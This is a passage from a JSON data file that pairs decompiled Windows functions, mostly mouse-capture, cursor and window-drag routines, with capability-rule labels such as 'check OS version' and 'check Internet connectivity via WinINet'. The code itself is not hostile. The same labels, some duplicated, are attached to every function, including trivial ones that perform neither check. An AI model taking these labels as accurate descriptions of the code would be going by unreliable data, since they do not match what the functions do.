            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0044a378(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uStack20;\n    \n    uStack20 = uStack20 & 0xffffff00;\n    cVar2 = fcn.00437d60();\n    if (cVar2 == '\\0') {\n        fcn.0043bc50();\n        iVar4 = fcn.00433ab4();\n        if ((iVar4 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n            iVar7 = 0;\n            do {\n                piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n                cVar2 = fcn.004047dc();\n                if (cVar2 != '\\0') {\n                    if (iVar4 == *(piVar1 + 0x21)) {\ncode_r0x0044a3ff:\n                        uVar3 = (**(*piVar1 + 0x50))();\n                        uStack20 = uStack20 | uVar3;\n                        break;\n                    }\n                    if (piVar1[0x24] != 0) {\n                        fcn.0044ac48();\n                        iVar5 = fcn.0044aca8();\n                        if (iVar5 != -1) goto code_r0x0044a3ff;\n                    }\n                }\n                iVar7 = iVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n    }\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 419
    },
    "0044a7ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a7ac(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x44a8a4;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.00404800();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.0044a244(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.0044a230();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004047dc(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.0044a7ac();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 537
    },
    "0044ac48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044ac48(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 87
    },
    "0045ad40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ad40(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x6c) = *(in_EAX + 0x6c) + -1;\n    if (*(in_EAX + 0x6c) < 1) {\n        *(in_EAX + 0x6c) = 0;\n        fcn.0045c8e8();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0044d350": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d350(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0044d2f4();\n    if ((iVar1 == 0) && (*0x499c62 != 0)) {\n        (**0x499c60)();\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0044d640": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0044d640(void)\n\n{\n    int32_t iVar1;\n    \n    sub.user32.dll_GetCapture();\n    iVar1 = fcn.0044d2f4();\n    if (((iVar1 != 0) && (*0x492710 != 0)) && (iVar1 == *(*0x492710 + 0x30))) {\n        iVar1 = *0x492710;\n    }\n    return iVar1;\n}\n",
        "token_count": 98
    },
    "0044d668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044d668(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x492710 = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004047dc(),  iVar1 = *0x492710,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x492710 = iVar1;\n        uVar3 = fcn.004585f8();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0044d930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044d930(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x44da2f;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea9c();\n        }\n        else if (iVar1 == 0x200) {\n            var_10h._0_2_ = param_2[2];\n            var_ch = var_10h;\n            var_10h._2_2_ = param_2[2] >> 0x10;\n            var_8h = var_10h._2_2_;\n            in_stack_ffffffc4 = *0x499c8c;\n            puStack44 = &stack0xfffffffc;\n            sub.user32.dll_ClientToScreen(*0x499c8c, &var_ch);\n            fcn.0044e40c();\n        }\n        else if (iVar1 == 0x202) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea9c();\n        }\n        else if (iVar1 == 0x205) {\n            if (*(in_EAX + 0x38) == '\\0') {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044ea9c();\n            }\n            else {\n                puStack44 = &stack0xfffffffc;\n                fcn.0044ea9c();\n            }\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.0044e40c();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack44 = &stack0xfffffffc;\n            fcn.0044ea9c();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack44 = &stack0xfffffffc;\n        fcn.0044e40c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    return;\n}\n",
        "token_count": 648
    },
    "0044db6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044db6c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.0040484c();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 75
    },
    "0044dc08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044dc08(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0044daf8();\n    *(in_EAX + 0x38) = 1;\n    uVar1 = fcn.00424e10();\n    *(in_EAX + 0x48) = uVar1;\n    fcn.0042b908();\n    fcn.00424f8c();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 225
    },
    "0044de00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044de00(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 255
    },
    "0044de6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0044de6c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.0044e2b4();\n    iVar2 = sub.user32.dll_GetWindow(hWnd, 4);\n    if (iVar2 != *(**0x494b0c + 0x30)) {\n        iVar2 = fcn.0044d2f4();\n        if (iVar2 == 0) {\n            return var_1h;\n        }\n        do {\n            iVar2 = *(iVar2 + 0x30);\n        } while (iVar2 != 0);\n        hWnd = fcn.004585f8();\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        var_18h = fcn.004585f8();\n        if (var_18h != hWnd) {\n            iVar2 = *(*(arg_8h + -0x10) + 0x30);\n            if (iVar2 == 0) {\n                cVar1 = fcn.004047dc();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.004585f8();\n                }\n            }\n            else {\n                do {\n                    iVar2 = *(iVar2 + 0x30);\n                } while (iVar2 != 0);\n                var_1ch = fcn.004585f8();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0044de00, &var_1ch);\n            sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.0040484c(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004047dc();\n                if ((((cVar1 == '\\0') || (*(*(*0x499c84 + 0x40) + 0x94) == 0)) ||\n                    (iVar2 = fcn.004585f8(),  iVar2 != hWnd)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  iVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 745
    },
    "0044e04c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0044e04c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x499ca8 != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x494b0c + 0xbc)) {\n            (**(**0x499cac + 8))();\n            iVar4 = *(*0x499ca8 + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.00419898();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1da) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.004585f8();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.0044e008(&var_1h + 1),  cVar1 == '\\0')) &&\n                           (cVar1 = fcn.0040484c(),  cVar1 != '\\0')) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.0040484c();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.0044d778();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x499cac)[2]) {\n                var_18h = fcn.0044d830(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.0044de6c(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 681
    },
    "0044e1a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e1a0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x499ca8 == 0) {\n            *0x499ca8 = fcn.00404620();\n        }\n        iVar1 = fcn.004198f4();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.0041978c();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.00419740();\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0044e36c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0044e36c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(*0x499c84 + 8);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1db) != '\\0')) && (*(iVar1 + 0x1ac) != 0)) &&\n       (iVar2 = fcn.00456fac(),  iVar2 != 0)) {\n        iVar2 = fcn.00456fac();\n        if ((iVar2 == 1) && (iVar2 = fcn.00419898(),  iVar2 == *(*0x499c84 + 0x40))) {\n            return 0;\n        }\n        iVar2 = fcn.0044ee0c();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.004198f4();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        var_4h = fcn.00456fc0();\n    }\n    return var_4h;\n}\n",
        "token_count": 296
    },
    "0044e40c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e40c(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x499ca0 == '\\0') &&\n        (uVar9 = *0x499c90 - *in_EAX >> 0x1f,  (*0x499c90 - *in_EAX ^ uVar9) - uVar9 < *0x499c9c)) &&\n       (uVar9 = *0x499c94 - in_EAX[1] >> 0x1f,  (*0x499c94 - in_EAX[1] ^ uVar9) - uVar9 < *0x499c9c)) {\n        return;\n    }\n    iVar10 = 0x44e467;\n    iVar7 = fcn.0044e2e0(*0x499c80);\n    if ((*0x499ca0 == '\\0') && (*0x499ca4 != 0)) {\n        iVar10 = *0x499c94;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0045a180(iVar10);\n    }\n    if (*(*0x499c80 + 0x8f) == '\\0') {\n        *0x499ca0 = '\\x01';\n    }\n    else {\n        *0x499ca0 = '\\x02';\n    }\n    if (iVar7 != (*0x499c84)[2]) {\n        fcn.0044e330();\n        if (*0x499c84 == NULL) {\n            return;\n        }\n        (*0x499c84)[2] = iVar7;\n        (*0x499c84)[3] = iVar10;\n        piVar1 = *0x499c84;\n        (*0x499c84)[4] = *in_EAX;\n        piVar1[5] = in_EAX[1];\n        fcn.0044e330();\n        if (*0x499c84 == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x499c84;\n    (*0x499c84)[4] = *in_EAX;\n    piVar1[5] = in_EAX[1];\n    if ((*0x499c84)[2] != 0) {\n        fcn.004503d4();\n        piVar1 = *0x499c84;\n        (*0x499c84)[6] = iStack28;\n        piVar1[7] = iStack24;\n    }\n    fcn.0044e330(in_EAX[1]);\n    (**(**0x499c84 + 4))();\n    if (*0x499ca4 != 0) {\n        if (((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) || (*(*0x499c84 + 1) != '\\0')) {\n            fcn.0045a15c();\n            if (*(*0x499ca4 + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.0045a180(iVar10);\n            }\n            else {\n                fcn.0045a27c();\n            }\n        }\n        else {\n            fcn.0045a2f0();\n            uVar8 = fcn.00444280();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.00444280();\n    sub.user32.dll_SetCursor();\n    if (*0x499ca0 == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.0040484c(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.0044e36c();\n            (*0x499c84)[0x18] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.0040484c();\n                *(*0x499c84 + 0x17) = uVar5;\n            }\n            else {\n                fcn.004503d4();\n                uVar5 = fcn.0040484c();\n                *(*0x499c84 + 0x17) = uVar5;\n            }\n        }\n        if ((*0x499c84 != NULL) && (cVar6 = fcn.00409954(),  cVar6 == '\\0')) {\n            if ((cVar4 != '\\0') && (cVar4 = (**(**0x499c84 + 0x3c))(),  cVar4 != '\\0')) {\n                (**(**0x499c84 + 0x34))();\n            }\n            (**(**0x499c84 + 0x30))();\n            piVar3 = *0x499c84;\n            piVar2 = *0x499c84 + 0x1a;\n            piVar1 = *0x499c84 + 0x14;\n            (*0x499c84)[0x19] = (*0x499c84)[0x13];\n            *piVar2 = *piVar1;\n            piVar3[0x1b] = piVar3[0x15];\n            piVar3[0x1c] = piVar3[0x16];\n        }\n    }\n    return;\n}\n",
        "token_count": 1258
    },
    "0044e6f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e6f4(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x499c84 = in_EAX;\n    in_EAX[2] = 0;\n    sub.user32.dll_GetCursorPos(0x499c90);\n    piVar1 = *0x499c84;\n    (*0x499c84)[4] = *0x499c90;\n    piVar1[5] = *0x499c94;\n    *0x499c98 = sub.user32.dll_GetCursor();\n    *0x499c8c = fcn.0044d8d4();\n    *0x499c9c = param_1;\n    cVar2 = fcn.004047dc();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x499ca0 = '\\0';\n        }\n        else {\n            *0x499ca0 = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x13];\n        if (in_EAX[0x15] == iVar3 || in_EAX[0x15] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x15] - in_EAX[0x13]);\n        }\n        iVar3 = in_EAX[0x14];\n        if (in_EAX[0x16] == iVar3 || in_EAX[0x16] - iVar3 < 0) {\n            in_EAX[0xc] = 0;\n            in_EAX[0xd] = 0;\n        }\n        else {\n            *(in_EAX + 0xc) = (in_EAX[5] - iVar3) / (in_EAX[0x16] - in_EAX[0x14]);\n        }\n        if (param_2 == '\\0') {\n            *0x499ca0 = '\\0';\n        }\n        else {\n            *0x499ca0 = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x499ca4 = (**(**0x499c84 + 8))();\n    if (*0x499ca4 != 0) {\n        iVar3 = *0x499c94;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.0045a180(iVar3);\n    }\n    *0x499cac = fcn.00404620();\n    if (*0x499ca0 != '\\0') {\n        fcn.0044e40c();\n    }\n    return;\n}\n",
        "token_count": 649
    },
    "0044e864": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044e864(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x44ea09;\n    iStack60 = *in_FS_OFFSET;\n    *0x499c80 = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x499c88 = 0;\n    if (*(in_EAX + 0x8f) == '\\0') {\n        puStack64 = 0x44e8ab;\n        puStack52 = &stack0xfffffffc;\n        fcn.0040484c();\n        if (*0x499c80 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x44e8d9;\n            var_8h = fcn.0044daf8();\n            *0x499c88 = 1;\n        }\n    }\n    else {\n        fcn.0040484c();\n        if (*0x499c80 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.0044dc08();\n            *0x499c88 = 1;\n        }\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x40) + 0x30) == 0) && (cVar1 = fcn.004047dc(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.0044e864::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x4c) = lpPoint;\n                *(var_8h + 0x50) = var_ch;\n            }\n            else {\n                fcn.00418420();\n                puStack64 = 0x44e9aa;\n                fcn.00450324();\n                *(var_8h + 0x4c) = var_18h;\n                *(var_8h + 0x50) = var_14h;\n            }\n            fcn.00418420();\n            *(var_8h + 0x54) = var_18h;\n            *(var_8h + 0x58) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x4c;\n            uVar2 = fcn.004585f8();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n        *(var_8h + 0x6c) = *(var_8h + 0x54);\n        *(var_8h + 0x70) = *(var_8h + 0x58);\n    }\n    fcn.0044e6f4();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 823
    },
    "0044ea28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044ea28(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x499c84 + 8) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x499ca0 == '\\x02')) {\n        cVar1 = (**(**0x499c80 + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x499c80)[0x25] != 0)) {\n            if ((*0x499c80)[0x25] != 0) {\n                uVar2 = fcn.0040484c();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 224
    },
    "0044ea9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
